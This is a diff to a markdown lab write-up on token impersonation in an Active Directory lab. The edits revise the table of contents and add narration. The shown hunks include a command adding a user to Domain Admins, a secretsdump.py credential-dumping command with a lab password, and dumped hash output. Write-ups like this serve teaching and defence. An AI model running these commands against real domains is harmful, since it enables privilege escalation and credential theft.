@@ -8,7 +8,7 @@
 
 ## Table of Contents
 
-- [Introduction](#introduction)
+<!-- - [Introduction](#introduction)
 - [Lab Setup](#lab-setup)
 - [Attack Flow](#attack-flow)
 - [Step 1 - Get a Meterpreter Session](#step-1---get-a-meterpreter-session)
@@ -27,7 +27,35 @@
   - [6.2 Add User to Domain Admins Group](#step-62---add-a-user-to-the-domain-admins-group)
 - [Step 7 - Dump All Hashes](#step-7---dump-all-hashes)
 - [Key Takeaways](#key-takeaways)
+- [Mitigation](#mitigation) -->
+
+- [Introduction](#introduction)
+- [Lab Setup](#lab-setup)
+- [Attack Flow](#attack-flow)
+
+- [Step 1 - Get a Meterpreter Session](#step-1---get-a-meterpreter-session)
+  - [1.1 Start Metasploit](#step-11-starting-metasploit)
+  - [1.2 Search for PsExec](#step-12-search-for-the-psexec-module)
+  - [1.3 Use exploit/windows/smb/psexec](#step-13-use-the-psexec-module)
+  - [1.4 View Module Options](#step-14-view-module-options)
+  - [1.5 Set Required Options](#step-15-setting-required-options)
+  - [1.6 Get Meterpreter Session](#step-16-get-meterpreter-session)
+
+- [Step 2 - Check UID](#step-2-check-uid)
+- [Step 3 - Load Incognito](#step-3-load-incognito)
+- [Step 4 - List Available Tokens](#step-4-list-available-tokens)
+- [Step 5 - Impersonate the Administrator Token](#step-5---impersonate-the-administrator-token)
+- [Step 6 - Verify Access](#step-6-verify-access)
+
+- [Step 7 - Add New User](#step-7-add-new-user)
+  - [Step 7.1 - Create a Domain User](#step-71-create-a-domain-user)
+  - [Step 7.2 - Add a User to the Domain Admins Group](#step-72-add-a-user-to-the-domain-admins-group)
+
+- [Step 8 - Dump All Hashes](#step-8-dump-all-hashes)
+
+- [Key Takeaways](#key-takeaways)
 - [Mitigation](#mitigation)
+- [References](#references)
 
 ## Introduction
 
@@ -464,7 +492,7 @@ This confirms that a new domain user was created successfully in my lab environm
 
 ## Step 7.2 - Add a User to the Domain Admins Group
 
-The following command attempts to add the user `test` to the `Domain Admins` group:
+After creating the user in my lab, I tried to add that user to the `Domain Admins` group.
 
 ```bash
 net group "Domain Admins" test /ADD /DOMAIN
@@ -489,7 +517,11 @@ The request will be processed at a domain controller for domain READTEAMBD.local
 The command completed successfully.
 ```
 
+This confirms the user test was added to the Domain Admins group in my lab environment.
+
 ## Step 8 - Dump All Hashes
+
+After creating the new domain user and adding it to the Domain Admins group in my lab, I used that account to dump all hashes from the domain controller.
 
 ```bash
 secretsdump.py readteambd.local/test:'@shahin123#!'@192.168.5.134
@@ -576,6 +608,7 @@ VICTIM-2$:aes256-cts-hmac-sha1-96:8decb9f00c39233817ca1a32114dd607ed4bec34e22a3e
 VICTIM-2$:aes128-cts-hmac-sha1-96:7fc817241159420e47632ca236d71258
 VICTIM-2$:des-cbc-md5:7ac1431fd0f20298
 ```
+Finally, I was able to dump all hashes successfully.
 
 <p align="center">
   <img src="/writeups/token impersonation attack/images/step7.png" width="600">
